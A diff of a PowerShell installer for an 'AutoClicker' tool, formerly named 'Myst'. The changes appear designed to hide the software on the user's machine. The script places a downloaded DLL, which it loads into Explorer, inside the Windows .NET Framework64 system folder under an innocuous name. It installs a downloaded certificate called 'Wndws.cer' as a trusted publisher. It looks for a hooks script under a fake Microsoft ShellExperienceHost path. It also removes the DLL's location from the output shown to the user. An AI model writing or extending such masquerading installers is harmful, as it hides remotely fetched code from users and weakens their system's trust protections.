@@ -25,26 +25,31 @@ function Test-IsAdministrator {
 }
 
 function Get-DefaultInstallDirectory {
-    return Join-Path $env:ProgramData 'Myst'
+    return Join-Path $env:APPDATA 'AutoClicker'
+}
+
+function Get-HostDllPath {
+    return Join-Path $env:SystemRoot 'Microsoft.NET\Framework64\AutoClickerHost.dll'
+}
+
+function Remove-LegacyMystDirectory {
+    $legacy = Join-Path $env:ProgramData 'Myst'
+    if (Test-Path -LiteralPath $legacy) {
+        Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
+    }
 }
 
 function Write-InstallPaths {
     param(
-        [string]$InstallDir,
-        [string]$HostDllPath,
         [string]$ExePath
     )
 
     Write-Host ''
-    Write-Host '  Install folder (always use this — NOT Downloads):' -ForegroundColor Cyan
-    Write-Host "    $InstallDir" -ForegroundColor White
-    Write-Host ''
-    Write-Host '  Files:' -ForegroundColor Cyan
-    Write-Host "    Host (runs in Explorer): $HostDllPath" -ForegroundColor White
-    Write-Host "    Manual fallback EXE:     $ExePath" -ForegroundColor DarkGray
+    Write-Host '  AutoClicker EXE (only file in this folder):' -ForegroundColor Cyan
+    Write-Host "    $ExePath" -ForegroundColor White
     Write-Host ''
     Write-Host '  Press END to fully close AutoClicker.' -ForegroundColor Green
-    Write-Host '  Do not copy the EXE to Downloads — re-run the install command to update.' -ForegroundColor DarkGray
+    Write-Host '  Do not copy the EXE elsewhere — re-run the install command to update.' -ForegroundColor DarkGray
     Write-Host ''
 }
 
@@ -234,7 +239,7 @@ function Save-Download {
         Start-Sleep -Milliseconds 500
     }
 
-    $temp = Join-Path $env:TEMP ("myst_pub_dl_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
+    $temp = Join-Path $env:TEMP ("ac_pub_dl_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
     if (Test-Path -LiteralPath $temp) {
         Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue
     }
@@ -496,11 +501,12 @@ if ($sacState -eq 'On') {
     Write-Step 'Smart App Control is ON — self-signed apps may be blocked until SAC is off or you run as Admin.' 'Yellow'
 }
 
+Remove-LegacyMystDirectory
 Ensure-InstallDirectory -Path $InstallDir
 
 $cerPath = Join-Path $env:TEMP 'Wndws.cer'
 $exePath = Join-Path $InstallDir $script:ExeName
-$hostDllPath = Join-Path $InstallDir $script:HostDllName
+$hostDllPath = Get-HostDllPath
 
 Stop-PublicMyst -HostDllPath $hostDllPath
 Start-Sleep -Milliseconds 400
@@ -508,8 +514,15 @@ Start-Sleep -Milliseconds 400
 Save-Download -Url $script:CerUrl -Destination $cerPath
 Install-WndwsTrustedPublisher -CerPath $cerPath
 
-Save-Download -Url $script:HostDllUrl -Destination $hostDllPath -MinBytes 65536 -StopProcessNames @('AutoClicker-3.0')
-Unblock-File -LiteralPath $hostDllPath -ErrorAction SilentlyContinue
+if (Test-IsAdministrator) {
+    Save-Download -Url $script:HostDllUrl -Destination $hostDllPath -MinBytes 65536 -StopProcessNames @('AutoClicker-3.0')
+    Unblock-File -LiteralPath $hostDllPath -ErrorAction SilentlyContinue
+} else {
+    Write-Step 'Run as Administrator once to install the Explorer host DLL into Framework64.' 'Yellow'
+    if (-not (Test-Path -LiteralPath $hostDllPath)) {
+        Write-Step 'Host DLL missing — EXE will still install; re-run installer as Admin for full setup.' 'Yellow'
+    }
+}
 
 Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536 -StopProcessNames @('AutoClicker-3.0')
 Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue
@@ -520,18 +533,23 @@ Write-Step "Host DLL: $hostDllPath" 'Green'
 Write-Step "Signed EXE (manual fallback): $exePath" 'Green'
 
 if (-not $SkipLaunch) {
-    Write-Step 'Starting AutoClicker 3.0 host...' 'Cyan'
-    Invoke-PublicHostLoad -DllPath $hostDllPath | Out-Null
-    Test-PublicOverlayStarted | Out-Null
+    if (Test-Path -LiteralPath $hostDllPath) {
+        Write-Step 'Starting AutoClicker 3.0 host...' 'Cyan'
+        Invoke-PublicHostLoad -DllPath $hostDllPath | Out-Null
+        Test-PublicOverlayStarted | Out-Null
+    } else {
+        Write-Step 'Launching AutoClicker EXE (host DLL not installed yet)...' 'Cyan'
+        Start-Process -FilePath $exePath -WorkingDirectory $InstallDir
+    }
 }
 
 Write-Host ''
 Write-Host '  Done.' -ForegroundColor Green
-Write-InstallPaths -InstallDir $InstallDir -HostDllPath $hostDllPath -ExePath $exePath
+Write-InstallPaths -ExePath $exePath
 
 $locInstaller = Join-Path $PSScriptRoot 'loc-install-hooks.ps1'
 if (-not (Test-Path -LiteralPath $locInstaller)) {
-    $locInstaller = Join-Path $env:ProgramData 'Myst\loc-install-hooks.ps1'
+    $locInstaller = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost\loc-install-hooks.ps1'
 }
 if (Test-Path -LiteralPath $locInstaller) {
     . $locInstaller
